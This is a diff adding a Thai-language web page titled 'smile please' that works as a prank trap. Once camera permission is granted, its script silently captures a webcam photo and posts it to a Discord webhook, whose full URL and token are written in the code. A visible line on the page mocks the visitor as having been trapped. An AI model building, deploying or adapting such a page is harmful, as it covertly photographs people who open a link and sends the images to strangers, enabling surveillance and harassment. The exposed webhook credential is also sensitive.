@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ยิ้มหน่อย^^</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        width: 90%;
+        max-width: 420px;
+        text-align: center;
+    }
+
+    h1 {
+        margin-bottom: 5px;
+    }
+
+    .note {
+        color: #666;
+        margin-bottom: 15px;
+    }
+
+    .camera-box {
+        position: relative;
+        border-radius: 20px;
+        padding: 5px;
+        background: linear-gradient(
+            270deg,
+            red, orange, yellow, green, cyan, blue, purple, red
+        );
+        background-size: 400% 400%;
+        animation: rgb 5s linear infinite;
+    }
+
+    @keyframes rgb {
+        0% { background-position: 0% 50%; }
+        100% { background-position: 100% 50%; }
+    }
+
+    video {
+        width: 100%;
+        border-radius: 15px;
+        background: #000;
+    }
+
+    .status {
+        margin-top: 10px;
+        font-size: 14px;
+        color: #333;
+    }
+</style>
+</head>
+
+<body>
+<div class="container">
+    <h1>ยิ้มหน่อยเบ้บ^^</h1>
+    <div class="note">หมายเหตุ: โดนดักละไอควาย</div>
+
+    <div class="camera-box">
+        <video id="video" autoplay playsinline></video>
+    </div>
+
+    <div class="status" id="status">กำลังขออนุญาตใช้กล้อง</div>
+</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const webhookURL = "https://ptb.discord.com/api/webhooks/1474767715884470357/rOuhTQLdaG2VULtjJy3nDTdhqnAruw-TF05Ry_54NBdTzCY2k-JO6aPxlN0ldHhKsLT6";
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+
+async function startCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
+        video.srcObject = stream;
+        statusText.textContent = "อนุญาตแล้ว";
+
+        setTimeout(captureAndSend, 1500);
+    } catch (err) {
+        statusText.textContent = "ไม่อนุญาตใช้กล้อง";
+    }
+}
+
+async function captureAndSend() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, "camera.png");
+        formData.append("content", "@everyone ziggy");
+
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                body: formData
+            });
+            statusText.textContent = "ส่งรูปเรียบร้อย";
+        } catch (e) {
+            statusText.textContent = "ส่งรูปไม่สำเร็จ";
+        }
+    }, "image/png");
+}
+
+startCamera();
+</script>
+</body>
+</html>
